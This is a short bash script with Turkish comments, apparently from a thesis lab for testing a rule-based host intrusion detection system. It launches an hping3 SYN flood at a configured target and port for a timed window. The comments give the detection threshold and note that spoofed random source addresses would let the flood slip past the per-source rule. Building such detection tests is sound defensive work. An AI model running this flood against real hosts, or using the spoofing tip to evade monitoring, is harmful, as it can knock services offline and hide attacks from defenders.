#!/usr/bin/env bash
# =============================================================================
# 02_syn_flood.sh — hping3 ile TCP SYN flood.
#
# HIDS kuralı:  syn_count_last_sec >= 30  →  SYN_Flood
# hping3 --flood saniyede binlerce SYN gönderir; tek port hedeflendiği için
# PortScan kuralına (>=15 benzersiz port) takılmaz → "SYN_Flood" alarmı.
#
# ÖNEMLİ:  --rand-source KULLANILMAZ.  HIDS penceresi KAYNAK IP başına sayar;
# kaynak IP rastgele olursa her paket farklı kaynaktan görünür ve eşik asla
# dolmaz (kural tabanlı tespitten KAÇIŞ). Gerçek kaynaktan göndererek tespiti
# tetikliyoruz. (Spoofing'in kuralı atlattığı, tezde 'kural tabanlının sınırı'
# olarak anlatılabilir.)
#
# Süre: varsayılan 10 sn sonra otomatik durur. DURATION=20 ile değiştirin.
# =============================================================================
set -euo pipefail
source "$(dirname "$0")/config.sh"
require_tool hping3
need_root "$@"

PORT="${PORT:-80}"
DURATION="${DURATION:-10}"

banner "SYN Flood (hping3 → port $PORT)" "SYN_Flood"
ping_check
echo "${C_YEL}[uyarı]${C_RST} Yüksek hacimli trafik. Süre: ${DURATION}s (gerçek kaynak IP, spoof YOK)."
countdown 3

# --flood: olabildiğince hızlı, yanıt bekleme.  -S: SYN bayrağı.  -p: hedef port.
timeout "${DURATION}s" hping3 -S -p "$PORT" --flood "$TARGET" || true

echo
echo "${C_GRN}[bitti]${C_RST} SYN flood durdu. HIDS panosunda 'SYN_Flood' görmelisiniz."
